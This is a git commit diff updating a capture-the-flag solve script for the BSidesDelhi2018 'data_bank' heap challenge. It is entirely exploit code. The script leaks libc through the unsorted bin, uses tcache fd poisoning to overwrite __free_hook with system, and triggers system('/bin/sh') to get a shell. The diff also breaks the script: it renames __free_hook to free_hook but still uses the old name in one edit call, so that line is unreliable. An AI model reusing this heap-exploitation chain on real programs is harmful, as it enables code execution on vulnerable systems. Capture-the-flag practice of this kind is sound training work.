d73c7e5c25aee907a3864ecd54a0e4208b17bccd
Badreddine CHamkhi <31930293+badsudo@users.noreply.github.com>
2022-01-01 13:19:52 +0100

    Update solve.py

--- BSidesDelhi2018/data_bank/solve.py
+++ BSidesDelhi2018/data_bank/solve.py
@@ -27,28 +27,30 @@ def view(index):
 
 def main():
 
-    add(0,0x100,"AAAA")
-    add(1,0x100,"BBBB")
+    add(0,0x80,b"A"*8)
+    add(1,0x80,b"B"*8)
+    #puting a chunk in the unsorted bin so we leak libc
     for i in range(7):
         remove(1)
     remove(0)
     view(0)
     p.recvuntil(' :')
     base = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
-    __free_hook = base + libc.sym['__free_hook']
+    free_hook = base + libc.sym['__free_hook']
     system = base + libc.sym['system']
-    log.info("base = " + hex(base))
-    log.info('free hook = ' + hex(__free_hook))
-    log.info('system = ' + hex(system))
-    add(2,0x50,"CCCCC")
-    add(3,0x50,"CCCCC")
+    log.success("base = " + hex(base))
+    log.success('free hook = ' + hex(free_hook))
+    log.success('system = ' + hex(system))
+    add(2,32,b"C"*8)
+    add(3,32,b"D"*8)
     remove(2)
     remove(3)
-    edit(3, p64(__free_hook))
-    add(4,0x50,"/bin/sh\x00")
-    add(5,0x50, "brrrrr")
-    edit(5,p64(system))
-    remove(4)
+    # TCACHE BIN of 32 is like : 3 -> 2 ( chunk 3 fd pointer point to chunk 2)
+    edit(3, p64(__free_hook)) # fd poisining
+    add(4, 32,b"/bin/sh\x00") # allocating a binsh string so we free it later on
+    add(5, 32, b"E"*8) # 
+    edit(5,p64(system)) # overwriting free_hook with system addr 
+    remove(4) # triggering system("/bin/sh");
     p.interactive()
 
 
